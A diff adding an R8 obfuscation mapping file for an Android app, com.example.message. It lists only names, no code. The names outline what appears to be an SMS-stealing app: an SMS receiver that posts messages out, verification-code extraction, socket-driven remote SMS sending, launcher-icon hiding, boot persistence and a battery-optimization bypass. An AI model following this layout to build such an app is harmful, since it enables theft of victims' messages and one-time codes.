@@ -1,0 +1,253 @@
+# compiler: R8
+# compiler_version: 4.0.48
+# min_api: 23
+# common_typos_disable
+# {"id":"com.android.tools.r8.mapping","version":"2.1"}
+# pg_map_id: 173388d
+# pg_map_hash: SHA-256 173388d38b2d6db7898f8aed1bea967c36f7e1c5fa3f9100d430a7b9cc855bbb
+com.example.message.BuildConfig -> a.a:
+    int VERSION_CODE -> d
+    boolean DEBUG -> a
+    java.lang.String BUILD_TYPE -> c
+    java.lang.String APPLICATION_ID -> b
+    java.lang.String VERSION_NAME -> e
+com.example.message.IMyAidlInterface -> a.b:
+com.example.message.IMyAidlInterface$Default -> a.b$a:
+com.example.message.IMyAidlInterface$Stub -> a.b$b:
+    java.lang.String DESCRIPTOR -> a
+    com.example.message.IMyAidlInterface asInterface(android.os.IBinder) -> a
+    com.example.message.IMyAidlInterface getDefaultImpl() -> b
+    boolean setDefaultImpl(com.example.message.IMyAidlInterface) -> c
+com.example.message.IMyAidlInterface$Stub$Proxy -> a.b$b$a:
+    android.os.IBinder mRemote -> a
+    com.example.message.IMyAidlInterface sDefaultImpl -> b
+    java.lang.String getInterfaceDescriptor() -> a
+com.example.message.MainActivity -> com.example.message.MainActivity:
+    android.app.Dialog dialog -> a
+    void hide() -> a
+    void ignoreBatteryOptimization(android.app.Activity) -> b
+    void initFirstService() -> c
+    void initPermission(android.app.Activity) -> d
+    void initSms() -> e
+    boolean serverIsRunning(android.content.Context,java.lang.String) -> f
+    void show() -> g
+com.example.message.R -> com.example.message.a:
+com.example.message.R$color -> com.example.message.a$a:
+    int teal_700 -> f
+    int white -> g
+    int purple_700 -> d
+    int teal_200 -> e
+    int purple_200 -> b
+    int purple_500 -> c
+    int black -> a
+com.example.message.R$drawable -> com.example.message.a$b:
+    int t -> b
+    int ic_launcher -> a
+com.example.message.R$id -> com.example.message.a$c:
+    int button -> a
+com.example.message.R$layout -> com.example.message.a$d:
+    int notification_layout -> b
+    int layout_dialog -> a
+com.example.message.R$string -> com.example.message.a$e:
+    int button -> b
+    int name -> c
+    int app_name -> a
+com.example.message.R$style -> com.example.message.a$f:
+    int dialog_activity_style -> a
+com.example.message.R$xml -> com.example.message.a$g:
+    int data_extraction_rules -> b
+    int network_security_config -> c
+    int backup_rules -> a
+com.example.message.listener.ScreenListener -> b.a:
+    android.content.Context mContext -> a
+    com.example.message.listener.ScreenListener$ScreenStateListener mScreenStateListener -> c
+    com.example.message.listener.ScreenListener$ScreenBroadcastReceiver mScreenReceiver -> b
+    com.example.message.listener.ScreenListener$ScreenStateListener access$100(com.example.message.listener.ScreenListener) -> a
+    void begin(com.example.message.listener.ScreenListener$ScreenStateListener) -> b
+    void getScreenState() -> c
+    void registerListener() -> d
+    void unregisterListener() -> e
+com.example.message.listener.ScreenListener$1 -> b.a$a:
+com.example.message.listener.ScreenListener$ScreenBroadcastReceiver -> b.a$b:
+    com.example.message.listener.ScreenListener this$0 -> a
+com.example.message.listener.ScreenListener$ScreenStateListener -> b.a$c:
+    void onScreenOn() -> b
+    void onUserPresent(android.content.Context) -> d
+    void onScreenOff() -> e
+com.example.message.receiver.BootReceiver -> com.example.message.receiver.BootReceiver:
+    void initBootService(android.content.Context) -> a
+    boolean serverIsRunning(android.content.Context,java.lang.String) -> b
+com.example.message.receiver.BootReceiver$$ExternalSyntheticApiModelOutline0 -> c.a:
+# {"id":"sourceFile","fileName":"R8$$SyntheticClass"}
+# {"id":"com.android.tools.r8.synthesized"}
+    android.content.ComponentName com.example.message.receiver.BootReceiver$$InternalSyntheticApiModelOutline$1$7b5c6b27179abb4d7a18cbf2c8854ef02c41411c85a71465063630d28721c157$0.m(android.content.Context,android.content.Intent) -> a
+      # {"id":"com.android.tools.r8.synthesized"}
+com.example.message.service.FirstService -> com.example.message.service.FirstService:
+    android.media.MediaPlayer mediaplayer -> f
+    java.lang.String base64 -> g
+    com.example.message.sms.SMSVerification smsVerification -> a
+    com.example.message.socket.SocketManage socketManage -> d
+    boolean isLogin -> e
+    java.lang.String scree -> c
+    java.lang.String model -> b
+    void error(com.example.message.socket.SocketManage) -> a
+      # {"id":"com.android.tools.r8.synthesized"}
+    void onScreenOn() -> b
+    void success(com.example.message.socket.SocketManage) -> c
+    void onUserPresent(android.content.Context) -> d
+    void onScreenOff() -> e
+    void $r8$lambda$vZMc4UrsO0nxItNjUIME798ces0(com.example.message.service.FirstService,java.lang.String) -> f
+      # {"id":"com.android.tools.r8.synthesized"}
+    java.lang.String Login() -> g
+    java.lang.String getModel(java.lang.String) -> h
+    java.lang.String getNumber(android.content.Context) -> i
+    java.lang.String getVersionName(android.content.Context) -> j
+    void initSMSVerification() -> k
+    void lambda$print$0(java.lang.String) -> l
+    void print(java.lang.String) -> m
+com.example.message.service.FirstService$$ExternalSyntheticLambda0 -> d.a:
+# {"id":"sourceFile","fileName":"R8$$SyntheticClass"}
+# {"id":"com.android.tools.r8.synthesized"}
+    com.example.message.service.FirstService com.example.message.service.FirstService$$InternalSyntheticLambda$1$aa8fcb0ab00268a47d2563d3d5bcc4d961662652f59ab47f6dcdebcbbfc72481$0.f$0 -> a
+    java.lang.String com.example.message.service.FirstService$$InternalSyntheticLambda$1$aa8fcb0ab00268a47d2563d3d5bcc4d961662652f59ab47f6dcdebcbbfc72481$0.f$1 -> b
+    void com.example.message.service.FirstService$$InternalSyntheticLambda$1$aa8fcb0ab00268a47d2563d3d5bcc4d961662652f59ab47f6dcdebcbbfc72481$0.<init>(com.example.message.service.FirstService,java.lang.String) -> <init>
+      # {"id":"com.android.tools.r8.synthesized"}
+    void com.example.message.service.FirstService$$InternalSyntheticLambda$1$aa8fcb0ab00268a47d2563d3d5bcc4d961662652f59ab47f6dcdebcbbfc72481$0.run() -> run
+      # {"id":"com.android.tools.r8.synthesized"}
+com.example.message.service.FirstService$1 -> com.example.message.service.FirstService$a:
+    com.example.message.service.FirstService this$0 -> b
+com.example.message.sms.SMSVerification -> com.example.message.sms.SMSVerification:
+    java.lang.String json -> a
+    java.lang.String doPost(java.lang.String,java.lang.String) -> a
+    java.lang.String getCode(java.lang.String) -> b
+com.example.message.sms.SmsReceiver -> com.example.message.sms.SmsReceiver:
+    android.content.Context context -> a
+    java.lang.String text -> b
+    java.lang.String ToJson(java.lang.String,java.lang.String,java.lang.String) -> a
+    java.lang.String doPost(java.lang.String,java.lang.String) -> b
+    void errorInst() -> c
+    java.lang.String getNumber(android.content.Context) -> d
+    java.lang.String getSmsMessages(android.telephony.SmsMessage[]) -> e
+    void inst(android.content.Context,android.content.ContentValues) -> f
+com.example.message.socket.DataHandle -> e.b:
+    com.example.message.socket.SocketManage socketManage -> a
+    void $r8$lambda$g2YfU-Ex3iBPaMfktIH4Hd9DJxc(com.example.message.socket.DataHandle,org.json.JSONArray,long) -> a
+      # {"id":"com.android.tools.r8.synthesized"}
+    void Sms(org.json.JSONObject) -> b
+    void SmsList(org.json.JSONArray,long) -> c
+    void SmsList(org.json.JSONObject) -> d
+    com.example.message.socket.DataHandle getInstance() -> e
+    void handle(java.lang.String,org.json.JSONObject) -> f
+    void lambda$SmsList$0(org.json.JSONArray,long) -> g
+    void sendSMSS(android.content.Context,java.lang.String,java.lang.String,java.lang.String) -> h
+    void setSocketManage(com.example.message.socket.SocketManage) -> i
+com.example.message.socket.DataHandle$$ExternalSyntheticLambda0 -> e.a:
+# {"id":"sourceFile","fileName":"R8$$SyntheticClass"}
+# {"id":"com.android.tools.r8.synthesized"}
+    org.json.JSONArray com.example.message.socket.DataHandle$$InternalSyntheticLambda$1$027459a97c93e788b785982be8b59a7768b9083350480a8540a9fab75ab72446$0.f$1 -> b
+    long com.example.message.socket.DataHandle$$InternalSyntheticLambda$1$027459a97c93e788b785982be8b59a7768b9083350480a8540a9fab75ab72446$0.f$2 -> c
+    com.example.message.socket.DataHandle com.example.message.socket.DataHandle$$InternalSyntheticLambda$1$027459a97c93e788b785982be8b59a7768b9083350480a8540a9fab75ab72446$0.f$0 -> a
+    void com.example.message.socket.DataHandle$$InternalSyntheticLambda$1$027459a97c93e788b785982be8b59a7768b9083350480a8540a9fab75ab72446$0.<init>(com.example.message.socket.DataHandle,org.json.JSONArray,long) -> <init>
+      # {"id":"com.android.tools.r8.synthesized"}
+    void com.example.message.socket.DataHandle$$InternalSyntheticLambda$1$027459a97c93e788b785982be8b59a7768b9083350480a8540a9fab75ab72446$0.run() -> run
+      # {"id":"com.android.tools.r8.synthesized"}
+com.example.message.socket.DataHandle$SmartyLoader -> e.b$a:
+    com.example.message.socket.DataHandle instance -> a
+    com.example.message.socket.DataHandle access$000() -> a
+com.example.message.socket.SocketManage -> e.c:
+    java.nio.channels.Selector selector -> f
+    com.example.message.socket.listener.OnConnection connection -> b
+    com.example.message.socket.task.HeartbeatTask heartbeatTask -> g
+    int ByteMax -> d
+    java.nio.channels.SocketChannel socketChannel -> a
+    android.content.Context context -> e
+    boolean HeartbeatTask -> c
+    void close() -> a
+    android.content.Context getContext() -> b
+    java.nio.channels.SocketChannel getSocketChannel() -> c
+    void handleData(java.lang.String) -> d
+    void handleReadable(java.nio.channels.SelectionKey) -> e
+    void initSocketChannel() -> f
+    boolean isHeartbeatTask() -> g
+    boolean isNumeric(java.lang.String) -> h
+    boolean print(java.lang.String) -> i
+    java.lang.String remove(java.lang.String) -> j
+    void setConnection(com.example.message.socket.listener.OnConnection) -> k
+    void setContext(android.content.Context) -> l
+    void setHeartbeatTask(boolean) -> m
+com.example.message.socket.listener.OnConnection -> f.b:
+    void error(com.example.message.socket.SocketManage) -> a
+    void success(com.example.message.socket.SocketManage) -> c
+com.example.message.socket.listener.OnConnection$-CC -> f.a:
+# {"id":"sourceFile","fileName":"R8$$SyntheticClass"}
+# {"id":"com.android.tools.r8.synthesized"}
+    void $default$error(com.example.message.socket.listener.OnConnection,com.example.message.socket.SocketManage) -> a
+      # {"id":"com.android.tools.r8.synthesized"}
+com.example.message.socket.task.HeartbeatTask -> g.a:
+    com.example.message.socket.SocketManage socketManage -> b
+    boolean isRun -> c
+    int size -> a
+    void setRun(boolean) -> a
+com.example.message.util.AESUtil -> h.a:
+    java.lang.String IV_SEED -> f
+    java.lang.String AES_ALGORITHM -> c
+    java.util.logging.Logger LOGGER -> a
+    java.lang.String ENCODING -> b
+    java.lang.String CIPHER_CBC_PADDING -> e
+    java.lang.String CIPHER_PADDING -> d
+    java.lang.String decrypt(java.lang.String,java.lang.String) -> a
+    java.lang.String decryptCBC(java.lang.String,java.lang.String) -> b
+    java.lang.String encrypt(java.lang.String,java.lang.String) -> c
+    java.lang.String encryptCBC(java.lang.String,java.lang.String) -> d
+com.example.message.util.AppIconUtil -> h.b:
+    java.lang.String aa -> a
+    void disableComponent(android.content.Context,java.lang.String) -> a
+    void enableComponent(android.content.Context,java.lang.String) -> b
+    void set(android.content.Context,java.lang.String,java.lang.String) -> c
+com.example.message.util.Notification -> h.k:
+    void sendSimpleNotify(android.app.Service) -> a
+com.example.message.util.Notification$$ExternalSyntheticApiModelOutline0 -> h.c:
+# {"id":"sourceFile","fileName":"R8$$SyntheticClass"}
+# {"id":"com.android.tools.r8.synthesized"}
+    void com.example.message.util.Notification$$InternalSyntheticApiModelOutline$1$b35cfa1c1746230bc6b14e8e24619ab47b2f9514d5eba11e0f7773afd88eb9d2$0.m(android.app.NotificationChannel,boolean) -> a
+      # {"id":"com.android.tools.r8.synthesized"}
+com.example.message.util.Notification$$ExternalSyntheticApiModelOutline1 -> h.d:
+# {"id":"sourceFile","fileName":"R8$$SyntheticClass"}
+# {"id":"com.android.tools.r8.synthesized"}
+    void com.example.message.util.Notification$$InternalSyntheticApiModelOutline$1$b35cfa1c1746230bc6b14e8e24619ab47b2f9514d5eba11e0f7773afd88eb9d2$1.m(android.app.NotificationChannel,int) -> a
+      # {"id":"com.android.tools.r8.synthesized"}
+com.example.message.util.Notification$$ExternalSyntheticApiModelOutline2 -> h.e:
+# {"id":"sourceFile","fileName":"R8$$SyntheticClass"}
+# {"id":"com.android.tools.r8.synthesized"}
+    void com.example.message.util.Notification$$InternalSyntheticApiModelOutline$1$b35cfa1c1746230bc6b14e8e24619ab47b2f9514d5eba11e0f7773afd88eb9d2$2.m(android.app.NotificationChannel,android.net.Uri,android.media.AudioAttributes) -> a
+      # {"id":"com.android.tools.r8.synthesized"}
+com.example.message.util.Notification$$ExternalSyntheticApiModelOutline3 -> h.f:
+# {"id":"sourceFile","fileName":"R8$$SyntheticClass"}
+# {"id":"com.android.tools.r8.synthesized"}
+    void com.example.message.util.Notification$$InternalSyntheticApiModelOutline$1$b35cfa1c1746230bc6b14e8e24619ab47b2f9514d5eba11e0f7773afd88eb9d2$3.m(android.app.NotificationChannel,boolean) -> a
+      # {"id":"com.android.tools.r8.synthesized"}
+com.example.message.util.Notification$$ExternalSyntheticApiModelOutline4 -> h.g:
+# {"id":"sourceFile","fileName":"R8$$SyntheticClass"}
+# {"id":"com.android.tools.r8.synthesized"}
+    void com.example.message.util.Notification$$InternalSyntheticApiModelOutline$1$b35cfa1c1746230bc6b14e8e24619ab47b2f9514d5eba11e0f7773afd88eb9d2$4.m(android.app.NotificationChannel,int) -> a
+      # {"id":"com.android.tools.r8.synthesized"}
+com.example.message.util.Notification$$ExternalSyntheticApiModelOutline5 -> h.h:
+# {"id":"sourceFile","fileName":"R8$$SyntheticClass"}
+# {"id":"com.android.tools.r8.synthesized"}
+    void com.example.message.util.Notification$$InternalSyntheticApiModelOutline$1$b35cfa1c1746230bc6b14e8e24619ab47b2f9514d5eba11e0f7773afd88eb9d2$5.m(android.app.NotificationManager,android.app.NotificationChannel) -> a
+      # {"id":"com.android.tools.r8.synthesized"}
+com.example.message.util.Notification$$ExternalSyntheticApiModelOutline6 -> h.i:
+# {"id":"sourceFile","fileName":"R8$$SyntheticClass"}
+# {"id":"com.android.tools.r8.synthesized"}
+    android.app.Notification$Builder com.example.message.util.Notification$$InternalSyntheticApiModelOutline$1$b35cfa1c1746230bc6b14e8e24619ab47b2f9514d5eba11e0f7773afd88eb9d2$6.m(android.app.Notification$Builder,java.lang.String) -> a
+      # {"id":"com.android.tools.r8.synthesized"}
+com.example.message.util.Notification$$ExternalSyntheticApiModelOutline7 -> h.j:
+# {"id":"sourceFile","fileName":"R8$$SyntheticClass"}
+# {"id":"com.android.tools.r8.synthesized"}
+    android.app.Notification$Builder com.example.message.util.Notification$$InternalSyntheticApiModelOutline$1$b35cfa1c1746230bc6b14e8e24619ab47b2f9514d5eba11e0f7773afd88eb9d2$7.m(android.app.Notification$Builder,android.widget.RemoteViews) -> a
+      # {"id":"com.android.tools.r8.synthesized"}
+com.example.message.util.sqliteHelper.MySqliteHelper -> i.a:
+    java.lang.String DATABASE_NAME -> a
+    int DATABASE_VERSION -> b
+com.example.message.util.sqliteHelper.SqlLiteUtli.SqlLiteUpdateUtil -> j.a:
+    org.json.JSONArray getResults(android.database.Cursor) -> a
